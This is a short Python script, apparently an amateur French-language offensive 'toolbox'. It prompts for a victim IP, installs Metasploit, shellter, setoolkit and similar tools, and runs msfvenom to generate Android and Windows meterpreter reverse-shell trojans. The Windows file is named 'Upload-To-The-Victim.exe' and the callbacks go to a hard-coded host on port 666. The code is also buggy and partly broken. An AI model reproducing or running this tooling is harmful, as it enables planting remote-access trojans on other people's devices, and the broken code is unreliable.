import os
traget_cible = input("Entrez l'IP de la victime: ")

print("traget cible ==>", traget_cible )

port = input("Entrez le port a utiliser : ")

print("Port ==>", port)

os.system(' cd /usr/bin/msfvenom/ ')
toolbox = print('''
_____________Tool_boX_______________
| [ 1 ]        Recon         [ 1 ] |    <======= Scann
| [ 2 ]       Exploit        [ 2 ] |    <======= Attack
| [ 3 ]       Payload        [ 3 ] |    <======= Execute script
| [ 4 ]  Generate a payload  [ 4 ] |    <======= Generate a Trojan
| [ 5 ] Install dependancies [ 5 ] |    <======= [Nmap , Metasploit , Msfvenom 
| [U]Update The Birdy-fr4M€W0rk[U] |                                |---- Ghost , shellter (wine), setoolkit]
|----------------------------------|                             
''')
print(toolbox)
option = int(input("Select from ToolboX : "))

if option == 5:
 os.system(' sudo apt install metasploit') 
 os.system(' sudo apt install nmap ')
 os.system(' sudo apt install msfpc ')
 os.system(' sudo apt install shellter ')
 os.system(' sudo apt install setoolkit ')
 os.system(' pip3 install git+https://github.com/EntySec/Ghost')
elif option >= 5:
 print(" L'option n'existe pas ! Select from the menu !") 
elif option == 4:
 print(''' 
 [ 1 ] Android                          [ Bypass les AVs     ]
 [ 2 ] Apple IOS                        [ Encodeur pas dispo ]
 [ 3 ] Linux                            [    Encodé auto.    ]                          
 [ 4 ] Microsoft Windows                [   Encodeur dispo   ]
 [ 5 ] Python                           [ Encoder non dispo  ]
 
 ''')

opt = int(input("Select an option : "))
if opt == 1:
 os.system(' msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.7.41 LPORT=666 /home/reverse_shell_tcp.apk ')
 print(" Saved at > /home/revrse_shell_tcp.apk ")
elif opt == 4:
 os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.7.41 LPORT=666 R > ~/Bureau/Upload-To-The-Victim.exe ')
 
print('''
_____________Tool_boX_______________
| [ 1 ]        Recon         [ 1 ] |    <======= Scann
| [ 2 ]       Exploit        [ 2 ] |    <======= Attack
| [ 3 ]       Payload        [ 3 ] |    <======= Execute script
| [ 4 ]  Generate a payload  [ 4 ] |    <======= Generate a Trojan
| [ 5 ] Install dependancies [ 5 ] |    <======= [Nmap , Metasploit , Msfvenom 
| [U]Update The Birdy-fr4M€W0rk[U] |                                |---- Ghost , shellter (wine), setoolkit]
|----------------------------------|                             
''')
 
option = int(input("Select from ToolboX : "))